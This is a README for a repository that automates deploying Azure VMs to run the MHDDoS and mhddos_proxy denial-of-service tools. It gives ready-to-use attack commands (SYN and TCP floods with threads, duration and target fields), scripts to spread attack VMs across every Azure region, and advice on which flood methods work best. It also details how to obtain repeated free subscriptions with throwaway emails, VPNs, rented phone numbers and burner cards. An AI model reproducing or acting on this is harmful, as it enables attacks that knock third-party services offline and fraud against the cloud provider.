> Note! You're free to use this repo a way you want, but you should pay attention to the legal liability you may have, if you use this configuration without compliance with your local laws

# Overview

Here I use Terraform to automate Azure VM deployment which run [MHDDOS](https://github.com/MHProDev/MHDDoS) or [MHDDOS_PROXY](https://github.com/porthole-ascend-cinnamon/mhddos_proxy) docker container.
You can deploy VMs to any Azure region; I prefer those that are located in Asia. Table of available regions:

| Region code        |     Region Name      |
|--------------------|:--------------------:|
| centralus          |      Central US      |
| eastasia           |      East Asia       |
| southeastasia      |    Southeast Asia    |
| eastus             |       East US        |
| eastus2            |      East US 2       |
| westus             |       West US        |
| westus2            |      West US 2       |
| northcentralus     |   North Central US   |
| southcentralus     |   South Central US   |
| westcentralus      |   West Central US    |
| northeurope        |     North Europe     |
| westeurope         |     West Europe      |
| japaneast          |      Japan East      |
| japanwest          |      Japan West      |
| brazilsouth        |     Brazil South     |
| australiasoutheast | Australia Southeast  |
| australiaeast      |    Australia East    |
| westindia          |      West India      |
| southindia         |     South India      |
| centralindia       |    Central India     |
| canadacentral      |    Canada Central    |
| canadaeast         |     Canada East      |
| uksouth            |       UK South       |
| ukwest             |       UK West        |
| koreacentral       |    Korea Central     |
| koreasouth         |     Korea South      |
| francecentral      |    France Central    |
| southafricanorth   |  South Africa North  |
| uaenorth           |      UAE North       |
| australiacentral   |  Australia Central   |
| switzerlandnorth   |  Switzerland North   |
| germanywestcentral | Germany West Central |
| norwayeast         |     Norway East      |
| westus3            |      West US 3       |
| swedencentral      |    Sweden Central    |

Terraform configuration used by default:

- Default region - `koreacentral` (Central Korea)
- Default VM count - `4` (In free Azure subscription it's allowed only 4 vCPUs in a single region)
- Default VM SKU - `Standard_F1s` (1 vCPU, 2 GiB RAM, accelerated networking - ON, price around 0.05 USD/hour)
- Default resource group name - `mhddosGroup`

To change default values you can amend the`variables.tf` file. To customize via terminal in step [manual flow](#manual-flow):

```shell
terraform apply ... -var="<variableName>=<variableValue>"
```

# Prerequisites

You must have a Microsoft Azure account, it's better off using a free subscription (200 USD for 30 days). Also,
installed azure CLI and terraform tools are required. To install these tools check out the following guides:

- Azure CLI https://docs.microsoft.com/en-us/cli/azure/install-azure-cli
- Terraform https://learn.hashicorp.com/tutorials/terraform/install-cli

In general, `udp/tcp/get` mhddos attacks are network intensive so your free subscription will be suspended after around
24 hours of active attacks. SYN mhddos attack doesn't require many network resources thus you can use your subscription
longer.  
After your subscription is over you can register a new Microsoft account and apply for a new free Azure subscription.
How to create Azure free account(200 USD for 30 days):
1. Create a new email address (i.e gmail.com)
2. Activate a VPN cause Microsoft may refuse giving you free credit if they notice multiple free subscription requests from the single IP
3. Create a new [Microsoft Account](https://signup.live.com/signup?)
4. Create a new virtual/internet bank card (i.e. in UA using Privat24) and send 1 USD to it
5. Apply for a [free Azure subscription](https://azure.microsoft.com/en-us/offers/ms-azr-0044p/). Fill in name, surname,
address and telephone number. You have to use different addresses and telephone numbers for each Microsoft Account. If you 
 run out of available physical telephone numbers you can rent some online, i.e. [here](https://service.pvaverify.com/)
6. Fill in credit card details from the step 4
If everything's done correctly, you'll get your free subscription and will be ready for the next steps.
If you have any other ideas or real experience on creating
multiple Microsoft Azure free accounts - feel free to describe that here in this section using a pull request or by dropping me an email.

# Getting started

1. Clone this repository:

```shell
git clone https://github.com/djebos/mhddos-azure-terraform.git
```

OR

Download zip archive of the repository and unzip it on your local machine into default
directory `mhddos-azure-terraform`

2. Go into the downloaded repository directory

```shell
cd mhddos-azure-terraform/
```

3. Log in Azure

```shell
az login
```
4. Select target and attack method. Open the `./modules/vms/cloud-init.yaml` file in any text editor. Find the `runcmd` attribute.  
 - For original [MHDDOS](https://github.com/MHProDev/MHDDoS) `"docker run --name mhddos --rm -d djebos/mhddos:latest` part of command is static and must be preserved. All your
customizations must follow this command as in example below:
   
```yaml
# TCP syn flood attack on ip 1.1.1.1, port 53, 100 threads, duration 999999 seconds
runcmd:
  - "docker run --name mhddos --rm -d djebos/mhddos:latest syn 1.1.1.1:53 100 999999 --debug"
  # here 'syn 1.1.1.1:53 100 999999' is your attack configuration that fully compliant with original MHDDOS
```
More about types of supported attacks on [MHDDOS oficial page](https://github.com/MHProDev/MHDDoS)
 - For [MHDDOS_PROXY](https://github.com/porthole-ascend-cinnamon/mhddos_proxy) 
    `"docker run --name mhddosProxy -d --rm ghcr.io/porthole-ascend-cinnamon/mhddos_proxy` part of command is static and must be preserved.   
    All your customizations must follow this command as in example below:
```yaml
# TCP flood attack on ip 1.1.1.1, port 80, 3000 threads per core, proxy refresh every 300 seconds, requests per proxy 50
runcmd:
  - "docker run --name mhddosProxy -d --rm ghcr.io/porthole-ascend-cinnamon/mhddos_proxy tcp://1.2.3.4:80 tcp://1.1.1.1:443 -t 3000 -p 300 --rpc 50 --http-methods TCP FLOOD --debug"
# here 'tcp://1.1.1.1:443 -t 3000 -p 300 --rpc 50 --http-methods TCP FLOOD --debug' is your attack configuration that fully compliant with MHDDOS_PROXY
```
Save the `./modules/vms/cloud-init.yaml` file.

## Automatic flow
Automatic flow is preferred for those who aren't familiar with `terraform`. If you're on Windows PC, you have to use 
linux terminal such as `Cygwin` or `Git Bash`.
4. Deploy VMs to the specified regions passed as arguments to the `./start-by-regions.sh`: 
```shell
./start-by-region.sh <region1> ... <regionN>
```

In the example below we deploy VMs to 4 regions:
```shell
./start-by-regions.sh eastus koreacentral southindia japaneast
```

Example of deployment to all possible regions:
```shell
./start-by-region.sh centralus eastasia southeastasia eastus eastus2 westus westus2 northcentralus southcentralus westcentralus northeurope westeurope japaneast japanwest brazilsouth australiasoutheast australiaeast westindia southindia centralindia canadacentral canadaeast uksouth ukwest koreacentral koreasouth francecentral southafricanorth uaenorth australiacentral switzerlandnorth germanywestcentral norwayeast westus3 swedencentral
```
5. Verify on azure portal dashboard the load of VMs' CPUs and network. CPU usage more 30-50% along with some network out traffic must be shown.
   To open that dashboard:
   ![azure portal dashboard button](pics/portal-menu-dashboard.png "How to open dashboard")
   Then you should see your dashboard as in example below:
   ![vm dashboard](pics/dashboard.png "Vm utilization dashboard")
   In fact, load percentage depends on the attack method and its configuration such as proxying, threads or request per
   connection count. There isn't a silver bullet configuration and attack method that works perfectly on any target. You
   have to make some effort to figure out the best for every case. Good methods to start with: `TCP`,`UDP`, `SYN`, `GET`
   , `STRESS`.
6. Stop attack and destroy VMs:
```shell
./destroy-by-region.sh <region1> ... <regionN>
```
In the example below we destroy VMs in 4 regions:
```shell
./destroy-by-regions.sh eastus koreacentral southindia japaneast
```
## Manual flow
Manual flow is recommended in case you need more flexibility in VM configuration and management through `terraform`.   
If you're not sure please proceed to the [automatic flow](#automatic-flow) 

4. Initialize terraform

```shell
terraform init
```
5. Deploy to the specified azure region (you must be logged in through `az login`). Examples:

```shell
# deploy to southindia region 4 VMs  with sku Standard_F1s
terraform apply -var='locations=["southindia"]' -auto-approve
# deploy to koreacentral and japaneast regions 4 VMs with sku Standard_F1s per each
terraform apply -var='locations=["koreacentral","japaneast"]' -auto-approve
# deploy to japaneast region 2 VMs with sku Standard_D2_v2, requires manual approve
terraform apply -var='locations=["japaneast"]' -var="vm_size=Standard_D2_v2" -var="vm_count=2"
```

6. Verify on azure portal dashboard the load of VMs' CPUs and network. CPU usage more 30-50% along with some network out traffic must be shown.
   To open that dashboard, click the button as on the picture below:
   ![azure portal dashboard button](pics/portal-menu-dashboard.png "How to open dashboard")
   Then you should see your dashboard as in example below:
   ![vm dashboard](pics/dashboard.png "Vm utilization dashboard")
   In fact, load percentage depends on the attack method and its configuration such as proxying, threads or request per
   connection count. There isn't a silver bullet configuration and attack method that works perfectly on any target. You
   have to make some effort to figure out the best for every case. Good methods to start with: `TCP`,`UDP`, `SYN`, `GET`
   , `STRESS`.
7. Stop attack and destroy VMs. Example:

```shell
terraform destroy -auto-approve
```

# Troubleshooting
(I). Trouble with azure-cli or terraform installation on your Linux system.

This is most likely due to the variaty of Linux distro versions.
In this way, you should try to find the installation instructions exactly for your version of the Linux distribution.
Example: https://idroot.us/install-terraform-ubuntu-20-04/

(II). Your attack could fail due to numerous reasons: wrong configuration, ip isn't reachable etc. Therefore, you have to
connect to your VMs and figure things out.

1. Find out the target VM's public ip through Azure Portal or using terminal

```shell
# Outputs VMs' public IPs by region in the format:
# {<regionName> = [<IP1>, <IP2>, ... , <IPn>]}
terraform output instance_public_ips_by_regions
```

2. Remove outdated private key (if exist)

```shell
rm -f <keyFileName>.pem
```

3.  Save private key to the file `<keyFileName>.pem`:

```shell
# Outputs VMs' private key by region in the format:
# {<regionName> = <<-EOT  
# -----BEGIN RSA PRIVATE KEY-----
# <some key content>
# -----BEGIN RSA PRIVATE KEY-----
#
# EOT
# }
# So, you should copy a key value only for the required region
terraform output tls_private_keys
```

4. Add a read access to the key file:

```shell
chmod 400 <keyFileName>.pem
```

5. Connect via SSH:

```shell
ssh -i <keyFileName>.pem azureuser@<your_vm_IP>
```

6. Check a status of the `mhddos` docker container:

```shell
sudo docker ps
```

7. Attach to container terminal

```shell
sudo docker attach <mhddos/mhddosProxy>
```
